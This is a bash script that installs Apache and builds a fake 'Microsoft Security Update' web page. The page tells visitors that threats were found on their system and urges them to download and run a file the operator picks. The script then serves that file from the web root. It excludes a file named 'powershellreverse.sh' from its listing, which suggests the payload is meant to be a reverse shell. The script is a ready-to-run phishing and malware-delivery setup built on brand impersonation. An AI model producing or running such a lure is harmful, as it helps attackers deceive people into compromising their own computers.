#!/bin/bash

# Variables
DOCUMENT_ROOT="/var/www/html"
HTML_FILE="$DOCUMENT_ROOT/index.html"

# Function to check if a command was successful
check_success() {
    if [[ $? -ne 0 ]]; then
        echo "$1 failed!"
        exit 1
    else
        echo "$1 succeeded."
    fi
}

# Check if running as root
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root" 
    exit 1
fi

# Install Apache if not already installed
if ! command -v apache2 &> /dev/null; then
    echo "Apache2 is not installed. Installing..."
    apt update
    apt install -y apache2
    check_success "Apache2 installation"
else
    echo "Apache2 is already installed."
fi

# Get the name of the current script
SCRIPT_NAME=$(basename "$0")

# List files in the current directory excluding the script itself and the website creation script
echo "Available files in the current directory:"
shopt -s extglob
files=( *) # List all files
for i in "${!files[@]}"; do
    if [[ "${files[i]}" != "$SCRIPT_NAME" && "${files[i]}" != "powershellreverse.sh" ]]; then
        echo "$((i + 1)). ${files[i]}"
    fi
done

# Prompt user for file selection
read -p "Select a file to be used on the website (enter the number): " file_choice

# Validate selection
if [[ "$file_choice" -gt 0 && "$file_choice" -le "${#files[@]}" ]]; then
    SELECTED_FILE="${files[$((file_choice - 1))]}"
else
    echo "Invalid selection."
    exit 1
fi

# Update SCRIPT_URL with the selected file's URL
SCRIPT_URL="http://$(hostname -I | awk '{print $1}')/$SELECTED_FILE" # Get the first IP address
echo "Selected file: $SELECTED_FILE"

# Create the HTML file with Microsoft security update content
cat <<EOF > $HTML_FILE
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Security Update</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #c4e0e5 0%, #d9b5e2 100%);
            color: #333;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
            padding: 30px;
            position: relative;
            z-index: 1;
        }
        h1 {
            color: #0078d7;
            margin-bottom: 20px;
        }
        p {
            font-size: 18px;
            line-height: 1.6;
        }
        .button {
            display: inline-block;
            background-color: #0078d7;
            color: white;
            padding: 12px 24px;
            text-decoration: none;
            border-radius: 6px;
            transition: background-color 0.3s, transform 0.3s;
            font-size: 16px;
            margin-top: 20px;
        }
        .button:hover {
            background-color: #0056a1;
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Microsoft Security Update</h1>
        <p>Dear User,</p>
        <p>We have detected potential security threats on your system. To ensure your computer's safety, please download and run the Microsoft Security Update provided below. This update is critical for maintaining the integrity of your system and protecting against malware.</p>
        <p>Your prompt action is necessary to prevent any disruptions in your service.</p>
        <a href="$SCRIPT_URL" class="button" download="$SELECTED_FILE">Download Security Update</a>
        <p>If you encounter any issues, please contact Microsoft Support for assistance.</p>
    </div>
</body>
</html>
EOF

check_success "HTML file creation"

# Copy the selected file to the web server's document root
cp "$SELECTED_FILE" "$DOCUMENT_ROOT/"
check_success "File copy to document root"

# Set permissions
chown -R www-data:www-data $DOCUMENT_ROOT
chmod -R 755 $DOCUMENT_ROOT

# Restart Apache
systemctl restart apache2
check_success "Apache restart"

# Check if the server is running
if systemctl is-active --quiet apache2; then
    echo "Apache is running."
else
    echo "Apache is not running!"
    exit 1
fi

# Check if HTML file is accessible
if curl -s --head --request GET http://$(hostname -I | awk '{print $1}')/index.html | grep "200 OK" > /dev/null; then
    echo "Website is accessible at http://$(hostname -I | awk '{print $1}')/index.html"
else
    echo "Website is not accessible."
    exit 1
fi

echo "Website setup completed successfully."
